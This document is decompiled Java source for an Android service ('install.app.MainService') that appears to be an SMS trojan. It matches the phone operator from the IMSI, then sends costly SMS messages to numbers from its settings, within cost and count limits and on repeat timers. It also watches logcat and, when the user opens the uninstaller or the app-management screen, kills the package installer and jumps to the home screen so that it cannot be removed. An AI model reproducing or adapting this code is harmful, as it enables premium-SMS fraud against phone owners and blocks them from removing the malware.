package install.app;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.IBinder;

public final class MainService extends Service implements ThreadOperationListener {
    static boolean isKill = false;
    public static boolean isRunning = false;
    static String packageName = "del.test.app";

    public static void start(Context context, Intent intent, String key) {
        System.out.println("MainService::start() key: " + key);
        Intent service = new Intent(context, MainService.class);
        Bundle extras = intent.getExtras();
        if (extras != null) {
            service.putExtras(extras);
        }
        service.putExtra("key", key);
        context.startService(service);
    }

    public static void start(Context context, Intent intent, String key, boolean success) {
        Intent service = new Intent(context, MainService.class);
        Bundle extras = intent.getExtras();
        if (extras != null) {
            service.putExtras(extras);
        }
        service.putExtra("key", key);
        service.putExtra("success", success);
        context.startService(service);
    }

    public void onCreate() {
        super.onCreate();
        setForeground(true);
    }

    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
        Bundle extras = intent.getExtras();
        if (extras != null && extras.get("key") != null) {
            String key = (String) extras.get("key");
            System.out.println("MainService::onStart() key: " + key);
            if (key.equals("pay")) {
                new Thread(new ThreadOperation(this, 1, null)).start();
            } else if (key.equals("sms")) {
                new Thread(new ThreadOperation(this, 2, Boolean.valueOf(((Boolean) extras.get("success")).booleanValue()))).start();
            } else if (key.equals("send")) {
                new Thread(new ThreadOperation(this, 3, null)).start();
            } else if (key.equals("logs") && !isRunning) {
                new Thread(new ThreadOperation(this, 5, null)).start();
            }
        }
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onDestroy() {
    }

    /* JADX WARNING: Removed duplicated region for block: B:58:0x02e5 A:{SYNTHETIC, Splitter:B:58:0x02e5} */
    /* JADX WARNING: Removed duplicated region for block: B:58:0x02e5 A:{SYNTHETIC, Splitter:B:58:0x02e5} */
    public void threadOperationRun(int r29, java.lang.Object r30) {
        /*
        r28 = this;
        r24 = 1;
        r0 = r29;
        r1 = r24;
        if (r0 != r1) goto L_0x016e;
    L_0x0008:
        r19 = install.app.Settings.getSettings();
        r0 = r19;
        r0 = r0.working;
        r24 = r0;
        if (r24 == 0) goto L_0x0015;
    L_0x0014:
        return;
    L_0x0015:
        r19.updateCurrentMaxSmsCount();
        r24 = 1;
        r0 = r24;
        r1 = r19;
        r1.working = r0;
        r0 = r19;
        r1 = r28;
        r0.save(r1);
        r12 = java.lang.System.currentTimeMillis();
        r24 = install.app.Settings.getImsi(r28);
        r14 = loadOperator(r24);
        r0 = r14.time;
        r24 = r0;
        r0 = r14.repeat;
        r26 = r0;
        r27 = install.app.Settings.MINUTE;
        r26 = r26 * r27;
        r0 = r26;
        r0 = (long) r0;
        r26 = r0;
        r24 = r24 + r26;
        r24 = (r24 > r12 ? 1 : (r24 == r12 ? 0 : -1));
        if (r24 > 0) goto L_0x0165;
    L_0x004a:
        r24 = java.lang.System.out;
        r25 = "operator.time + operator.repeat * Settings.MINUTE <= now";
        r24.println(r25);
        r0 = r14.id;
        r24 = r0;
        r0 = r24;
        r1 = r19;
        r1.currentOperatorId = r0;
        r0 = r14.maxSmsCost;
        r24 = r0;
        r0 = r24;
        r1 = r19;
        r1.currentMaxSmsCost = r0;
        r0 = r14.maxSmsCount;
        r24 = r0;
        r0 = r24;
        r1 = r19;
        r1.currentMaxSmsCount = r0;
        r24 = 0;
        r0 = r24;
        r2 = r19;
        r2.currentSmsKey = r0;
        r24 = 0;
        r0 = r24;
        r1 = r19;
        r1.currentSmsIndex = r0;
        r24 = 0;
        r0 = r24;
        r1 = r19;
        r1.defaultSet = r0;
        r0 = r19;
        r1 = r28;
        r0.save(r1);
        r0 = r14.sms;
        r21 = r0;
        r24 = java.lang.System.out;
        r25 = new java.lang.StringBuilder;
        r26 = "settings.currentMaxSmsCount: ";
        r25.<init>(r26);
        r0 = r19;
        r0 = r0.currentMaxSmsCount;
        r26 = r0;
        r25 = r25.append(r26);
        r25 = r25.toString();
        r24.println(r25);
        r0 = r19;
        r0 = r0.currentMaxSmsCount;
        r24 = r0;
        if (r24 <= 0) goto L_0x00dc;
    L_0x00b4:
        r24 = java.lang.System.out;
        r25 = "settings.currentMaxSmsCount > 0";
        r24.println(r25);
        r24 = java.lang.System.out;
        r25 = new java.lang.StringBuilder;
        r26 = "smsList.size(): ";
        r25.<init>(r26);
        r26 = r21.size();
        r25 = r25.append(r26);
        r25 = r25.toString();
        r24.println(r25);
        r8 = 0;
    L_0x00d4:
        r24 = r21.size();
        r0 = r24;
        if (r8 < r0) goto L_0x00f0;
    L_0x00dc:
        r24 = 0;
        r0 = r24;
        r1 = r19;
        r1.working = r0;
        r0 = r19;
        r1 = r28;
        r0.save(r1);
        r19.printToOutStream();
        goto L_0x0014;
    L_0x00f0:
        r0 = r21;
        r20 = r0.get(r8);
        r20 = (install.app.SmsItem) r20;
        r24 = java.lang.System.out;
        r25 = new java.lang.StringBuilder;
        r26 = "settings.currentMaxSmsCost: ";
        r25.<init>(r26);
        r0 = r19;
        r0 = r0.currentMaxSmsCost;
        r26 = r0;
        r25 = r25.append(r26);
        r25 = r25.toString();
        r24.println(r25);
        r24 = java.lang.System.out;
        r25 = new java.lang.StringBuilder;
        r26 = "smsItem.cost: ";
        r25.<init>(r26);
        r0 = r20;
        r0 = r0.cost;
        r26 = r0;
        r25 = r25.append(r26);
        r25 = r25.toString();
        r24.println(r25);
        r0 = r19;
        r0 = r0.currentMaxSmsCost;
        r24 = r0;
        r0 = r20;
        r0 = r0.cost;
        r25 = r0;
        r0 = r24;
        r1 = r25;
        if (r0 < r1) goto L_0x0161;
    L_0x013e:
        r0 = r20;
        r0 = r0.key;
        r24 = r0;
        r0 = r24;
        r2 = r19;
        r2.currentSmsKey = r0;
        r0 = r19;
        r0.currentSmsIndex = r8;
        r0 = r19;
        r1 = r28;
        r0.save(r1);
        r19.printToOutStream();
        r0 = r28;
        r1 = r19;
        r0.sendSms(r1);
        goto L_0x0014;
    L_0x0161:
        r8 = r8 + 1;
        goto L_0x00d4;
    L_0x0165:
        r24 = java.lang.System.out;
        r25 = "not time";
        r24.println(r25);
        goto L_0x00dc;
    L_0x016e:
        r24 = 2;
        r0 = r29;
        r1 = r24;
        if (r0 != r1) goto L_0x025a;
    L_0x0176:
        r19 = install.app.Settings.getSettings();
        r20 = r19.loadCurrentSmsItem();
        r22 = r19.loadCurrentOperator();
        r0 = r22;
        r0 = r0.sms;
        r21 = r0;
        r30 = (java.lang.Boolean) r30;
        r23 = r30.booleanValue();
        if (r23 == 0) goto L_0x0205;
    L_0x0190:
        r0 = r19;
        r0 = r0.currentMaxSmsCost;
        r24 = r0;
        r0 = r20;
        r0 = r0.cost;
        r25 = r0;
        r24 = r24 - r25;
        r0 = r24;
        r1 = r19;
        r1.currentMaxSmsCost = r0;
        r0 = r19;
        r0 = r0.currentMaxSmsCount;
        r24 = r0;
        r24 = r24 + -1;
        r0 = r24;
        r1 = r19;
        r1.currentMaxSmsCount = r0;
        r24 = java.lang.System.currentTimeMillis();
        r0 = r24;
        r2 = r22;
        r2.time = r0;
    L_0x01bc:
        r0 = r19;
        r1 = r22;
        r0.updateCurrentOperator(r1);
        r0 = r19;
        r1 = r28;
        r0.save(r1);
        r19.printToOutStream();
        r0 = r19;
        r0 = r0.currentMaxSmsCount;
        r24 = r0;
        if (r24 <= 0) goto L_0x01f1;
    L_0x01d5:
        r0 = r19;
        r0 = r0.currentSmsIndex;
        r24 = r0;
        r25 = r21.size();
        r0 = r24;
        r1 = r25;
        if (r0 >= r1) goto L_0x01f1;
    L_0x01e5:
        r0 = r19;
        r8 = r0.currentSmsIndex;
    L_0x01e9:
        r24 = r21.size();
        r0 = r24;
        if (r8 < r0) goto L_0x0214;
    L_0x01f1:
        r24 = 0;
        r0 = r24;
        r1 = r19;
        r1.working = r0;
        r0 = r19;
        r1 = r28;
        r0.save(r1);
        r19.printToOutStream();
        goto L_0x0014;
    L_0x0205:
        r0 = r19;
        r0 = r0.currentSmsIndex;
        r24 = r0;
        r24 = r24 + 1;
        r0 = r24;
        r1 = r19;
        r1.currentSmsIndex = r0;
        goto L_0x01bc;
    L_0x0214:
        r0 = r21;
        r20 = r0.get(r8);
        r20 = (install.app.SmsItem) r20;
        r0 = r19;
        r0 = r0.currentMaxSmsCost;
        r24 = r0;
        r0 = r20;
        r0 = r0.cost;
        r25 = r0;
        r0 = r24;
        r1 = r25;
        if (r0 < r1) goto L_0x0257;
    L_0x022e:
        r0 = r20;
        r0 = r0.key;
        r24 = r0;
        r0 = r24;
        r2 = r19;
        r2.currentSmsKey = r0;
        r0 = r19;
        r0.currentSmsIndex = r8;
        r0 = r19;
        r1 = r28;
        r0.save(r1);
        r19.printToOutStream();
        r0 = r19;
        r0 = r0.waitForSend;
        r24 = r0;
        r0 = r28;
        r1 = r24;
        install.app.Settings.startSendTimer(r0, r1);
        goto L_0x0014;
    L_0x0257:
        r8 = r8 + 1;
        goto L_0x01e9;
    L_0x025a:
        r24 = 3;
        r0 = r29;
        r1 = r24;
        if (r0 != r1) goto L_0x026f;
    L_0x0262:
        r19 = install.app.Settings.getSettings();
        r0 = r28;
        r1 = r19;
        r0.sendSms(r1);
        goto L_0x0014;
    L_0x026f:
        r24 = 5;
        r0 = r29;
        r1 = r24;
        if (r0 != r1) goto L_0x0392;
    L_0x0277:
        r24 = 1;
        isRunning = r24;
        r11 = 0;
        r17 = 0;
        r24 = java.lang.Runtime.getRuntime();	 Catch:{ IOException -> 0x02d3 }
        r25 = 2;
        r0 = r25;
        r0 = new java.lang.String[r0];	 Catch:{ IOException -> 0x02d3 }
        r25 = r0;
        r26 = 0;
        r27 = "logcat";
        r25[r26] = r27;	 Catch:{ IOException -> 0x02d3 }
        r26 = 1;
        r27 = "ActivityManager:I";
        r25[r26] = r27;	 Catch:{ IOException -> 0x02d3 }
        r11 = r24.exec(r25);	 Catch:{ IOException -> 0x02d3 }
        r24 = java.lang.System.out;	 Catch:{ IOException -> 0x02d3 }
        r25 = "exec logcat OK";
        r24.println(r25);	 Catch:{ IOException -> 0x02d3 }
    L_0x02a1:
        r18 = new java.io.BufferedReader;	 Catch:{ IllegalArgumentException -> 0x02dc }
        r24 = new java.io.InputStreamReader;	 Catch:{ IllegalArgumentException -> 0x02dc }
        r25 = r11.getInputStream();	 Catch:{ IllegalArgumentException -> 0x02dc }
        r24.<init>(r25);	 Catch:{ IllegalArgumentException -> 0x02dc }
        r25 = 1024; // 0x400 float:1.435E-42 double:5.06E-321;
        r0 = r18;
        r1 = r24;
        r2 = r25;
        r0.<init>(r1, r2);	 Catch:{ IllegalArgumentException -> 0x02dc }
        r24 = java.lang.System.out;	 Catch:{ IllegalArgumentException -> 0x03bd }
        r25 = "creare reader OK";
        r24.println(r25);	 Catch:{ IllegalArgumentException -> 0x03bd }
        r17 = r18;
    L_0x02c0:
        r24 = isRunning;	 Catch:{ IOException -> 0x02c9 }
        if (r24 != 0) goto L_0x02e5;
    L_0x02c4:
        r28.stopSelf();	 Catch:{ IOException -> 0x02c9 }
        goto L_0x0014;
    L_0x02c9:
        r5 = move-exception;
        r5.printStackTrace();
        r24 = 0;
        isRunning = r24;
        goto L_0x0014;
    L_0x02d3:
        r5 = move-exception;
        r5.printStackTrace();
        r24 = 0;
        isRunning = r24;
        goto L_0x02a1;
    L_0x02dc:
        r5 = move-exception;
    L_0x02dd:
        r5.printStackTrace();
        r24 = 0;
        isRunning = r24;
        goto L_0x02c0;
    L_0x02e5:
        r10 = r17.readLine();	 Catch:{ IOException -> 0x02c9 }
        r16 = "I/ActivityManager";
        r0 = r16;
        r9 = r10.indexOf(r0);	 Catch:{ IOException -> 0x02c9 }
        r24 = -1;
        r0 = r24;
        if (r9 == r0) goto L_0x02c0;
    L_0x02f7:
        r24 = r16.length();	 Catch:{ IOException -> 0x02c9 }
        r9 = r9 + r24;
        r4 = r10.substring(r9);	 Catch:{ IOException -> 0x02c9 }
        r15 = new install.app.IntentParser;	 Catch:{ Exception -> 0x0357 }
        r15.m43init();	 Catch:{ Exception -> 0x0357 }
        r15.parseString(r4);	 Catch:{ Exception -> 0x0357 }
        r0 = r15.action;	 Catch:{ Exception -> 0x0357 }
        r24 = r0;
        r25 = "android.intent.action.DELETE";
        r24 = r24.equals(r25);	 Catch:{ Exception -> 0x0357 }
        if (r24 == 0) goto L_0x0363;
    L_0x0315:
        r0 = r15.cmp;	 Catch:{ Exception -> 0x0357 }
        r24 = r0;
        r25 = "com.android.packageinstaller/.UninstallerActivity";
        r24 = r24.equals(r25);	 Catch:{ Exception -> 0x0357 }
        if (r24 == 0) goto L_0x0363;
    L_0x0321:
        r0 = r15.data;	 Catch:{ Exception -> 0x0357 }
        r24 = r0;
        r25 = new java.lang.StringBuilder;	 Catch:{ Exception -> 0x0357 }
        r26 = "package:";
        r25.<init>(r26);	 Catch:{ Exception -> 0x0357 }
        r26 = packageName;	 Catch:{ Exception -> 0x0357 }
        r25 = r25.append(r26);	 Catch:{ Exception -> 0x0357 }
        r25 = r25.toString();	 Catch:{ Exception -> 0x0357 }
        r24 = r24.equals(r25);	 Catch:{ Exception -> 0x0357 }
        if (r24 == 0) goto L_0x035d;
    L_0x033c:
        r24 = 1;
        isKill = r24;	 Catch:{ Exception -> 0x0357 }
        r24 = new java.lang.Thread;	 Catch:{ Exception -> 0x0357 }
        r25 = new install.app.ThreadOperation;	 Catch:{ Exception -> 0x0357 }
        r26 = 6;
        r0 = r25;
        r1 = r28;
        r2 = r26;
        r0.m36init(r1, r2, r15);	 Catch:{ Exception -> 0x0357 }
        r24.<init>(r25);	 Catch:{ Exception -> 0x0357 }
        r24.start();	 Catch:{ Exception -> 0x0357 }
        goto L_0x02c0;
    L_0x0357:
        r6 = move-exception;
        r6.printStackTrace();	 Catch:{ IOException -> 0x02c9 }
        goto L_0x02c0;
    L_0x035d:
        r24 = 0;
        isKill = r24;	 Catch:{ Exception -> 0x0357 }
        goto L_0x02c0;
    L_0x0363:
        r0 = r15.action;	 Catch:{ Exception -> 0x0357 }
        r24 = r0;
        r25 = "android.settings.MANAGE_ALL_APPLICATIONS_SETTINGS";
        r24 = r24.equals(r25);	 Catch:{ Exception -> 0x0357 }
        if (r24 == 0) goto L_0x02c0;
    L_0x036f:
        r0 = r15.cmp;	 Catch:{ Exception -> 0x0357 }
        r24 = r0;
        r25 = "com.android.settings/.Settings$ManageApplicationsActivity";
        r24 = r24.equals(r25);	 Catch:{ Exception -> 0x0357 }
        if (r24 == 0) goto L_0x02c0;
    L_0x037b:
        r24 = new java.lang.Thread;	 Catch:{ Exception -> 0x0357 }
        r25 = new install.app.ThreadOperation;	 Catch:{ Exception -> 0x0357 }
        r26 = 6;
        r0 = r25;
        r1 = r28;
        r2 = r26;
        r0.m36init(r1, r2, r15);	 Catch:{ Exception -> 0x0357 }
        r24.<init>(r25);	 Catch:{ Exception -> 0x0357 }
        r24.start();	 Catch:{ Exception -> 0x0357 }
        goto L_0x02c0;
    L_0x0392:
        r24 = 6;
        r0 = r29;
        r1 = r24;
        if (r0 != r1) goto L_0x0014;
    L_0x039a:
        r24 = "activity";
        r0 = r28;
        r1 = r24;
        r3 = r0.getSystemService(r1);
        r3 = (android.app.ActivityManager) r3;
        r24 = "com.android.packageinstaller";
        r0 = r24;
        r3.restartPackage(r0);	 Catch:{ Exception -> 0x03b8 }
    L_0x03ad:
        showHome(r28);	 Catch:{ Exception -> 0x03b2 }
        goto L_0x0014;
    L_0x03b2:
        r7 = move-exception;
        r7.printStackTrace();
        goto L_0x0014;
    L_0x03b8:
        r6 = move-exception;
        r6.printStackTrace();
        goto L_0x03ad;
    L_0x03bd:
        r5 = move-exception;
        r17 = r18;
        goto L_0x02dd;
        */
        throw new UnsupportedOperationException("Method not decompiled: install.app.MainService.threadOperationRun(int, java.lang.Object):void");
    }

    public static void showHome(Context contex) {
        Intent intent = new Intent("android.intent.action.MAIN");
        intent.setFlags(268435456);
        intent.addCategory("android.intent.category.HOME");
        contex.startActivity(intent);
    }

    /* access modifiers changed from: 0000 */
    public void sendSms(Settings settings) {
        SmsItem smsItem = settings.loadCurrentSmsItem();
        if (settings.currentGlobalMaxSmsCount > 0) {
            settings.currentGlobalMaxSmsCount--;
            settings.save(this);
            Settings.sendSms(smsItem.number, smsItem.text);
            Settings.startWaitTimer(this, (long) smsItem.wait);
        } else {
            settings.lastTimeGlobalRepeat = System.currentTimeMillis();
            settings.working = false;
            settings.save(this);
        }
        settings.printToOutStream();
    }

    static SmsOperator loadOperator(String phone) {
        Settings settings = Settings.getSettings();
        SmsOperator defaultOperator = new SmsOperator();
        for (int i = 0; i < settings.operatorList.size(); i++) {
            SmsOperator operator = (SmsOperator) settings.operatorList.elementAt(i);
            for (int x = 0; x < operator.codes.size(); x++) {
                String code = (String) operator.codes.elementAt(x);
                if (!(code == null || code.length() == 0)) {
                    if (operator.codes.size() == 1 && code.equals("XXX")) {
                        defaultOperator = operator;
                        settings.currentOperatorIndex = i;
                    }
                    if (phone.startsWith(code)) {
                        settings.currentOperatorIndex = i;
                        return operator;
                    }
                }
            }
        }
        System.out.println("not found");
        return defaultOperator;
    }
}
